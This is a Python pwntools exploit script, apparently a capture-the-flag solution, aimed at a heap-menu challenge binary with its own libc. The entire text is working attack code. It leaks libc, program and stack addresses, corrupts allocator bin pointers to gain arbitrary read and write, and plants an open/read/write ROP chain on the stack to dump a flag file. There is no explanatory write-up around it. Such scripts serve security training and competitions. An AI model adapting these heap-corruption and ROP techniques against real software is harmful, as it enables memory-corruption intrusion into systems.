from pwn import*
context(os = 'linux', arch = 'amd64', log_level = 'debug')

s = process('./pwn')
libc = ELF('./libc.so')

def add(content):
	s.sendlineafter(b'>>', b'1')
	s.sendafter(b'Please input the content\n', content)

def delete(index):
	s.sendlineafter(b'>>', b'2')
	s.sendlineafter(b'idx:\n', str(index))

def show(index):
	s.sendlineafter(b'>>', b'3')
	s.sendlineafter(b'idx\n', str(index))

def edit(index,content):
	s.sendlineafter(b'>>', b'4')
	s.sendlineafter(b'idx:\n', str(index))
	s.sendafter(b'Content\n', content)

add(b'a'*0x8) # 0
add(b'b'*0x8) # 1
show(0)
libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x292e50
success('[+] libc_base=> '+hex(libc_base))

mal = libc_base + 0x292ac0
environ = libc_base + 0x294fd8
bin35_head_addr = mal + 8 + 0x18*35 + 8
open_addr = libc_base + 0x23399
read_addr = libc_base + 0x59f8e
write_addr = libc_base + 0x5a3b5
pop_rdi_ret = libc_base + 0x0000000000014862
pop_rsi_ret = libc_base + 0x000000000001c237
pop_rdx_ret = libc_base + 0x000000000001bea2
flag_addr = libc_base + 0x2953c0

delete(0)
edit(0, p64(bin35_head_addr - 0x18)*2)
add(b'./flag\x00') # 2
add(p64(0)*13 + b'\x30') # 3
add(p64(0)*6) # 4
show(0)

elf_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x202040
success('[+] elf_base=> '+hex(elf_base))

edit(0, p64(elf_base + 0x202040) + p64(environ) + p64(0)*4)
show(1)
stack_back = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x70
success('[+] stack_back=> '+hex(stack_back))

rop = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open_addr)
rop+= p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x20) + p64(read_addr)
rop+= p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x20) + p64(write_addr)

edit(0, p64(elf_base + 0x202040) + p64(stack_back) + p64(0)*4)
edit(1,rop)

#gdb.attach(s)
s.interactive()
